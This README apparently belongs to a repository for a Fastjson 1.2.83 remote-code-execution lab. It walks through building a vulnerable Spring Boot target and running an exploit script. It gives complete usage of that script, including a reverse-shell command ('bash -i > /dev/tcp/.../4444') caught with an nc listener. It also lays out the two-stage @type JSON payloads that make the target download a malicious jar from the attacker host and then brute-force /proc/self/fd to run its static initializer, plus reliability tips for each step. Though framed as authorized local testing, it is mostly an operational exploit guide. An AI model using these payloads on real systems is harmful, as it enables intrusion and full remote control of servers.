# Fastjson 1.2.83 RCE 漏洞测试环境 (QVD-2026-43021)

> ⚠️ 本环境用于**授权测试 / 本地复现**。Fastjson 1.2.83 的 FD 两段式类加载 RCE，无需 `autoTypeSupport`、无需第三方依赖，`safeMode` 未启用（默认）即可触发。

## 一、漏洞概述

Fastjson 1.2.66 ~ 1.2.83 `checkAutoType` 中 `@JSONType` 注解探测路径存在远程类加载漏洞：

- 攻击者构造 `@type` 指向一个**可被 `getResourceAsStream` 读到的类**（带 `@JSONType` 注解），`checkAutoType` 会直接信任放行，绕过 deny/accept 黑名单；
- 类加载时执行 `<clinit>`，从而 RCE。

**实测可用条件（重要）：**

| 条件 | 说明 |
|---|---|
| 靶场形态 | Spring Boot 2.7 FatJar（用 `LaunchedURLClassLoader`，能解析 `jar:` 嵌套 URL） |
| **靶机 JVM** | **必须 OpenJDK 17**（`aarch64` 实测）。Zulu / JDK 8 经 `/proc/self/fd` 解析 jar 返回 `NULL`，FD 链**静默失败**（详见第五节） |
| 出网 | 靶机需能访问攻击机的 HTTP 端口（下载 `probe.jar`） |

> 原 hzhsec 文档写"条件 JDK 8"是针对经典单对象 `jar:http` 技法；但在 1.2.83 上该技法不触发 `<clinit>`、打不出 RCE。本仓库验证通过的路径是 **`--mode fd` + OpenJDK 17**。

## 二、文件结构

```
fastjson-1.2.83-rce/
├── pom.xml                         # Spring Boot 2.7 靶场 (Java 17)
├── src/main/.../ParseController.java  # /parse 反序列化入口, /info 健康检查
├── poc/
│   ├── exp.py                      # 利用脚本(自包含: 生成 probe + 托管 HTTP + 发包)
│   ├── GenProbe.java               # 生成恶意 probe.jar (ASM 动态织入 <clinit>)
│   ├── lib/                        # fastjson-1.2.83.jar, asm-9.6.jar
│   └── www/                        # 运行时生成 (被 .gitignore 排除)
└── README.md
```

## 三、构建靶场

```bash
mvn clean package
# 产物: target/fastjson-rce-env-1.0.0.jar
```

## 四、使用（复现步骤）

### Step 0：编译 GenProbe（注意 `--release 17`）

```bash
cd poc
javac --release 17 -cp "lib/*" -d . GenProbe.java
cd ..
```

> ⚠️ 若本机 `javac` 是 21（如 Kali 装了 openjdk-21-jdk），**必须加 `--release 17`**。否则生成 class 版本 65，被运行时的 OpenJDK 17（只认 ≤61）拒载 → `UnsupportedClassVersionError`，探针生成失败、exp 不发。

### Step 1：启动靶场（OpenJDK 17）

```bash
fuser -k 18080/tcp; sleep 1
setsid java -jar target/fastjson-rce-env-1.0.0.jar > /tmp/target.log 2>&1 < /dev/null &
for i in $(seq 1 25); do curl -s -o /dev/null http://127.0.0.1:18080/info && break; sleep 1; done
curl -s http://127.0.0.1:18080/info
```

> `setsid` + `< /dev/null` **关键**：否则后台 `java` 进程偶发被 shell 用 `SIGTTIN` 挂起（`suspended (tty input)`），靶场实际没在跑，利用必然失败。

### Step 2：利用（exp.py 自带生成 probe + 托管 HTTP，**无需手起 http.server**）

`exp.py` 用法：

```
python3 poc/exp.py lhost lport target [选项]
  位置参数:
    lhost    攻击机 IP (靶机能访问到的地址)
    lport    攻击机 HTTP 端口 (托管 probe.jar, exp.py 会自动起服务)
    target   靶场 URL (如 http://127.0.0.1:18080)
  选项:
    --mode     fd | jdk8-http | auto   (默认 fd)
    --cmd      要执行的命令 (默认 id)
    --timeout  超时秒数 (默认 60, FD 模式建议 60+)
    --max-fd   FD 枚举上限 (默认 256, 本环境必填 2048)
    --tag      标签 (区分多次测试, 绕过类缓存)
    --endpoint API 端点 (默认 /parse)
```

**① 命令回显验证：**

```bash
python3 poc/exp.py 127.0.0.1 19090 http://127.0.0.1:18080 \
    --mode fd --cmd "id" --timeout 60 --max-fd 2048
# 靶机上 /tmp 下会出现命令输出(若 --cmd 写文件), 或响应 200 表示已触发
```

**② 交互式反弹 shell（先开监听，再打）：**

```bash
# 终端 A —— 先开监听, 常驻别关 (Kali 默认无 rlwrap, 裸 nc 即可)
nc -lvnp 4444

# 终端 B —— 触发 (--cmd 是字符串, 由靶机 /bin/bash -c 执行)
python3 poc/exp.py 127.0.0.1 19090 http://127.0.0.1:18080 \
    --mode fd --tag sh1 \
    --cmd "bash -i > /dev/tcp/127.0.0.1/4444 0<&1 2>&1" \
    --timeout 60 --max-fd 2048
```

> ⚠️ `--cmd` 里的 `bash -i > /dev/tcp/...` 是**字符串参数**，由靶机经 `/bin/bash -c` 解析（bash 内置 `/dev/tcp` 伪设备）。**不要直接敲进 Kali 默认的 zsh**——zsh 无此伪设备会报 `zsh: 没有那个文件或目录: /dev/tcp/...`。

回到终端 A，几秒后掉出 `root@...:$` 提示符，直接敲 `id` / `ls -la /root` 即可。

## 五、注意（踩坑必读）

1. **每次测试必须重启靶场（或换 `--tag`）**：fastjson 会把加载过的类缓存，同名类 `<clinit>` 不再重跑 → 发了但没反应。
2. **`--max-fd 2048` 必填**：`GenProbe` 硬编码生成 `fd 3~2048` 的类，但 `exp.py` 默认 `--max-fd 256` 且不传给 GenProbe。靶场稳态已开 ~407 个 fd，`probe.jar` 落在 400+，不传 2048 枚举不到 → 必然漏掉。
3. **4444 上只能有 1 个 nc 监听**：多次尝试残留的 nc 会让内核把反弹连接分给别的，你盯着的那个没收到 → "没反应"。
4. **监听必须先于利用打开**：反弹 shell 是靶机主动连回，监听没起就发了 → 连不上。
5. **靶场 JVM 必须 OpenJDK 17**：Zulu / JDK 8 在 `aarch64` 上经 `/proc/self/fd` 软链解析 jar 返回 `NULL`，FD 链静默失败（纯 JDK 实现差异，与 fastjson 版本无关）。

## 六、漏洞原理（FD 两段式，本仓库验证路径）

```
第一阶段 (投送占位 jar):
  {"@type":"jar:http:..2130706433:19090.probe!.foo.Exception"}
        ↓ Fastjson 触发 HTTP GET http://127.0.0.1:19090/probe
        ↓ 靶机下载 probe.jar, 以某个 fd (如 N) 挂在 /proc/self/fd/N

第二阶段 (定位已打开的 fd 并触发):
  [ {"@type":"jar:http:..2130706433:19090.probe!.foo.Exception"},
    {"@type":"jar:file:.proc.self.fd.3!.fd3.Exception"},
    ...
    {"@type":"jar:file:.proc.self.fd.2048!.fd2048.Exception"} ]
        ↓ 枚举 fd 3~2048, 命中已下载的 jar
        ↓ typeName.replace('.','/')+".class" → "jar:file:/proc/self/fd/N!/fdN/Exception.class"
        ↓ LaunchedURLClassLoader.getResourceAsStream() 成功 (OpenJDK 17)
        ↓ 检测到 @JSONType → loadClass → <clinit> 执行命令 → RCE
```

- `jar:file:.proc.self.fd.3` 用点代斜杠，经 `replace('.','/')` 开头 `.` 变 `/`，得到绝对路径 `/proc/self/fd/3`，`!` 之后是 jar 内条目。
- 为什么用 **JSON 数组**：单对象在 1.2.83 不一定触发 `<clinit>`；数组逐个实例化才真正初始化类，从而执行命令。
- `jdk8-http` 模式（`http:..` 远程类加载）保留作对照，但本环境实测 **fd 模式 + OpenJDK 17** 才是稳定可用路径。

## 七、参考

- QVD-2026-43021
- hzhsec / dinosn 原始 exp 思路
- Freebuf 等公开分析（"全军覆没"对照：经典单对象 `jar:http` 在 1.2.83 失效）
